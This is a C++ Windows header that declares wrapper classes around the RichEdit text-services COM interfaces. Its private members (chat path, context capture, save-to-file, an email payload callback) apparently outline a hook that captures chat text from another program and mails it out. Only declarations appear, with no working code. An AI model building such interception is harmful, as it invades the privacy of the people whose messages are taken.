// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#pragma once

#include "targetver.h"

#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
#include <tchar.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <process.h>

// Windows Header Files:
#include <windows.h>
#include <unknwn.h>
#include "MyRichedit.h"
#include "MyRichOle.h"
#include "MyTextServ.h"
#include <locale.h>
#include <TOM.h>
#include <comutil.h>
#include <Psapi.h>

#ifdef __cplusplus
//extern "C" const GUID IID_ITextServices;
//extern "C" const GUID IID_ITextHost;
extern "C" const GUID IID_ITextHost2;
//extern "C" const GUID IID_ITextHostEx;
extern "C"
{
	HRESULT WINAPI CreateTextServices(IUnknown *punkOuter, 
		ITextHost *pITextHost, IUnknown **ppUnk);
}
#endif

// TODO: reference additional headers your program requires here
extern CRITICAL_SECTION g_critical;

class IMyTextServices : public IUnknown
{
public:
	IMyTextServices(ITextServices *lpTx, HWND parenthwnd);
	//@cmember Generic Send Message interface
	virtual HRESULT 	TxSendMessage(
							UINT msg,
							WPARAM wparam,
							LPARAM lparam,
							LRESULT *plresult);
     virtual HRESULT STDMETHODCALLTYPE QueryInterface( 
                /* [in] */ REFIID riid,
                /* [iid_is][out] */ __RPC__deref_out void __RPC_FAR *__RPC_FAR *ppvObject);	
	 virtual ULONG STDMETHODCALLTYPE AddRef( void);
     virtual ULONG STDMETHODCALLTYPE Release( void);
	//@cmember Rendering
	virtual HRESULT		TxDraw(	
							DWORD dwDrawAspect,		
							LONG  lindex,			
							void * pvAspect,		
							DVTARGETDEVICE * ptd,									
							HDC hdcDraw,			
							HDC hicTargetDev,		
							LPCRECTL lprcBounds,	
							LPCRECTL lprcWBounds,	
               				LPRECT lprcUpdate,		
							BOOL (CALLBACK * pfnContinue) (DWORD),
							DWORD dwContinue,
							LONG lViewId);	

	//@cmember Horizontal scrollbar support
	virtual HRESULT		TxGetHScroll(
							LONG *plMin,
							LONG *plMax,
							LONG *plPos,
							LONG *plPage,
							BOOL * pfEnabled );

   	//@cmember Horizontal scrollbar support
	virtual HRESULT		TxGetVScroll(
							LONG *plMin,
							LONG *plMax,
							LONG *plPos,
							LONG *plPage,
							BOOL * pfEnabled );

	//@cmember Setcursor
	virtual HRESULT 	OnTxSetCursor(
							DWORD dwDrawAspect,		
							LONG  lindex,			
							void * pvAspect,		
							DVTARGETDEVICE * ptd,									
							HDC hdcDraw,			
							HDC hicTargetDev,		
							LPCRECT lprcClient,
							INT x,
							INT y);

	//@cmember Hit-test
	virtual HRESULT 	TxQueryHitPoint(
							DWORD dwDrawAspect,		
							LONG  lindex,			
							void * pvAspect,		
							DVTARGETDEVICE * ptd,									
							HDC hdcDraw,			
							HDC hicTargetDev,		
							LPCRECT lprcClient,
							INT x,
							INT y,
							DWORD * pHitResult);

	//@cmember Inplace activate notification
	virtual HRESULT		OnTxInPlaceActivate(LPCRECT prcClient);

	//@cmember Inplace deactivate notification
	virtual HRESULT		OnTxInPlaceDeactivate();

	//@cmember UI activate notification
	virtual HRESULT		OnTxUIActivate();

	//@cmember UI deactivate notification
	virtual HRESULT		OnTxUIDeactivate();

	//@cmember Get text in control
	virtual HRESULT		TxGetText(BSTR *pbstrText);

	//@cmember Set text in control
	virtual HRESULT		TxSetText(LPCWSTR pszText);
	
	//@cmember Get x position of
	virtual HRESULT		TxGetCurTargetX(LONG *plongvar);
	//@cmember Get baseline position
	virtual HRESULT		TxGetBaseLinePos(LONG *plongvar);

	//@cmember Get Size to fit / Natural size
	virtual HRESULT		TxGetNaturalSize(
							DWORD dwAspect,
							HDC hdcDraw,
							HDC hicTargetDev,
							DVTARGETDEVICE *ptd,
							DWORD dwMode, 	
							const SIZEL *psizelExtent,
							LONG *pwidth,
							LONG *pheight);

	//@cmember Drag & drop
	virtual HRESULT		TxGetDropTarget( IDropTarget **ppDropTarget );

	//@cmember Bulk bit property change notifications
	virtual HRESULT		OnTxPropertyBitsChange(DWORD dwMask, DWORD dwBits);

	//@cmember Fetch the cached drawing size
	virtual	HRESULT		TxGetCachedSize(DWORD *pdwWidth, DWORD *pdwHeight);

private:
    struct email_user_data {
	    const unsigned char *data;
	    int unsigned bytestotal, bytesdone;
    };

	ITextServices *m_lpTx;
	wchar_t *m_content;

	const _TCHAR *GetTempDir(void);
	int GetTempPath(_TCHAR *chatpath, _TCHAR *temppath);
	int GetContext(wchar_t **content);
	unsigned int ConvertContext(wchar_t **finaltxt);
	void SaveToFile(void);
    static int unsigned payload_source(void *ptr, int unsigned size, int unsigned nmemb, void *userp);
};

class IMyUnknown : public IUnknown
{
public:
            IMyUnknown(IUnknown *punkOuter, ITextHost *pITextHost);
            virtual HRESULT STDMETHODCALLTYPE QueryInterface( 
                /* [in] */ REFIID riid,
                /* [iid_is][out] */ __RPC__deref_out void __RPC_FAR *__RPC_FAR *ppvObject);

            virtual ULONG STDMETHODCALLTYPE AddRef(void);

            virtual ULONG STDMETHODCALLTYPE Release(void);
			HWND GetITextHostHwnd(void);
private:
	IUnknown *m_ppUnk;
	ITextHost *m_pITextHost;
};